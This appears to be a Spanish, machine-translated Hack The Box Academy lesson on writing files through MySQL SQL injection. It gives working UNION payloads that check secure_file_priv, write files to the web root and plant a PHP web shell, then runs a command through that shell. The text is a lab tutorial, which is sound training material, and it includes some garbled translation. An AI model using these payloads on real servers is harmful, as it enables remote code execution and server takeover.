# Writing Files

Cuando se trata de escribir archivos en el servidor de back-end, se vuelve mucho más restringido en los DBMS modernos, ya que podemos utilizar esto para escribir un shell web en el servidor remoto, por lo tanto, obtener la ejecución del código y hacerse cargo del servidor. Esta es la razón por la cual los DBMS modernos desactivan el archivo de archivos de forma predeterminada y requieren ciertos privilegios para que DBA escriba archivos. Antes de escribir archivos, primero debemos verificar si tenemos suficientes derechos y si el DBMS permite escribir archivos.

---

# **Escribir privilegios de archivo**

Para poder escribir archivos en el servidor de back-end utilizando una base de datos MySQL, requerimos tres cosas:

1. Usuario`FILE`privilegio habilitado
2. MySQL Global`secure_file_priv`variable no habilitada
3. Acceso de escritura a la ubicación que queremos escribir en el servidor de back-end

Ya hemos descubierto que nuestro usuario actual tiene el`FILE`privilegio necesario para escribir archivos. Ahora debemos verificar si la base de datos MySQL tiene ese privilegio. Esto se puede hacer revisando el`secure_file_priv`variable global.

### **seguro_file_priv**

El[seguro_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)La variable se usa para determinar de dónde leer/escribir archivos. Un valor vacío nos permite leer archivos de todo el sistema de archivos. De lo contrario, si se establece un determinado directorio, solo podemos leer desde la carpeta especificada por la variable. Por otro lado,`NULL`significa que no podemos leer/escribir desde ningún directorio. Mariadb tiene esta variable configurada en vacío de forma predeterminada, lo que nos permite leer/escribir en cualquier archivo si el usuario tiene el`FILE`privilegio. Sin embargo,`MySQL`usos`/var/lib/mysql-files`como la carpeta predeterminada. Esto significa que leer archivos a través de un`MySQL`La inyección no es posible con la configuración predeterminada. Peor aún, algunas configuraciones modernas predeterminadas a`NULL`, lo que significa que no podemos leer/escribir archivos en ningún lugar dentro del sistema.

Entonces, veamos cómo podemos descubrir el valor de`secure_file_priv`. Dentro`MySQL`, podemos usar la siguiente consulta para obtener el valor de esta variable:

Código:sql

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

```

Sin embargo, mientras estamos usando un`UNION`inyección, tenemos que obtener el valor usando un`SELECT`declaración. Esto no debería ser un problema, ya que todas las variables y la mayoría de las configuraciones se almacenan dentro del`INFORMATION_SCHEMA`base de datos.`MySQL`Las variables globales se almacenan en una tabla llamada[global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), y según la documentación, esta tabla tiene dos columnas`variable_name`y`variable_value`.

Tenemos que seleccionar estas dos columnas de esa tabla en el`INFORMATION_SCHEMA`base de datos. Hay cientos de variables globales en una configuración de MySQL, y no queremos recuperarlas todas. Luego filtraremos los resultados para mostrar solo el`secure_file_priv`variable, usando el`WHERE`Cláusula sobre la que aprendimos en una sección anterior.

La consulta SQL final es la siguiente:

Código:sql

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

```

Entonces, similar a otros`UNION`Consultas de inyección, podemos obtener el resultado de la consulta anterior con la siguiente carga útil. Recuerda agregar dos columnas más`1` & `4`como datos basura para tener un total de 4 columnas:

Código:sql

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

```

![](https://academy.hackthebox.com/storage/modules/33/secure_file_priv.jpg)

Y el resultado muestra que el`secure_file_priv`El valor está vacío, lo que significa que podemos leer/escribir archivos en cualquier ubicación.

---

# **Seleccionar en Outfile**

Ahora que hemos confirmado que nuestro usuario debe escribir archivos en el servidor de back-end, intentemos hacerlo utilizando el`SELECT .. INTO OUTFILE`declaración. El[Seleccionar en Outfile](https://mariadb.com/kb/en/select-into-outfile/)La declaración se puede usar para escribir datos de consultas selectas en archivos. Esto generalmente se usa para exportar datos de tablas.

Para usarlo, podemos agregar`INTO OUTFILE '...'`Después de nuestra consulta para exportar los resultados en el archivo que especificamos. El siguiente ejemplo guarda la salida del`users`mesa en el`/tmp/credentials`archivo:

Escribir archivos

```
SELECT * from users INTO OUTFILE '/tmp/credentials';

```

Si vamos al servidor de back-end y`cat`el archivo, vemos el contenido de esa tabla:

Escribir archivos

```
xnoxos@htb[/htb]$ cat /tmp/credentials 1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f

```

También es posible directamente`SELECT`Strings en archivos, lo que nos permite escribir archivos arbitrarios en el servidor de back-end.

Código:sql

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

```

Cuando nosotros`cat`el archivo, vemos ese texto:

Escribir archivos

```
xnoxos@htb[/htb]$ cat /tmp/test.txt this is a test

```

Escribir archivos

```
xnoxos@htb[/htb]$ ls -la /tmp/test.txt -rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt

```

Como podemos ver arriba, el`test.txt`el archivo fue creado con éxito y es propiedad de la`mysql`usuario.

Consejo: las exportaciones de archivos avanzados utilizan la función 'from_base64 ("base64_data")' para poder escribir archivos largos/avanzados, incluidos los datos binarios.

---

# **Escribir archivos a través de la inyección SQL**

Intentemos escribir un archivo de texto en la raíz web y verificar si tenemos permisos de escritura. La consulta a continuación debe escribir`file written successfully!`hacia`/var/www/html/proof.txt`Archivo, al que podemos acceder en la aplicación web:

Código:sql

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

```

**Nota:**Para escribir un shell web, debemos conocer el directorio web base para el servidor web (es decir, la raíz web). Una forma de encontrarlo es usar`load_file`Para leer la configuración del servidor, como la configuración de Apache que se encuentra en`/etc/apache2/apache2.conf`, Configuración de Nginx en`/etc/nginx/nginx.conf`, o configuración IIS en`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, o podemos buscar en línea otras posibles ubicaciones de configuración. Además, podemos ejecutar un escaneo confuso e intentar escribir archivos en diferentes posibles raíces web, utilizando[Esta lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)o[Esta lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finalmente, si ninguno de los anteriores funciona, podemos usar errores del servidor que se nos muestran e intentar encontrar el directorio web de esa manera.

El`UNION`La carga útil de la inyección sería la siguiente:

Código:sql

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

```

![](https://academy.hackthebox.com/storage/modules/33/write_proof.png)

No vemos ningún error en la página, lo que indica que la consulta tuvo éxito. Verificar el archivo`proof.txt`En la raíz web, vemos que de hecho existe:

![](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)

Nota: Vemos la cadena que arrojamos junto con '1', '3' antes y '4' después. Esto se debe a que todo el resultado de la consulta de 'unión' se escribió en el archivo. Para que la salida sea más limpia, podemos usar "" en lugar de números.

---

# **Escribir un shell web**

Habiendo confirmado los permisos de escritura, podemos seguir adelante y escribir un shell web de PHP en la carpeta Webroot. Podemos escribir el siguiente WebShell PHP para poder ejecutar comandos directamente en el servidor de fondo:

Código:php

```php
<?php system($_REQUEST[0]);?>
```

Podemos reutilizar nuestro anterior`UNION`carga útil de inyección y cambiar la cadena a lo anterior, y el nombre del archivo a`shell.php`:

Código:sql

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

```

   ', "", "" En Outfile' /var/www/html/shell.php'---'>

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

Una vez más, no vemos ningún error, lo que significa que la escritura de archivo probablemente funcionó. Esto se puede verificar navegando al`/shell.php`archivo y ejecución de comandos a través del`0`parámetro, con`?0=id`En nuestra URL:

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

La salida del`id`El comando confirma que tenemos la ejecución del código y nos estamos ejecutando como el`www-data`usuario.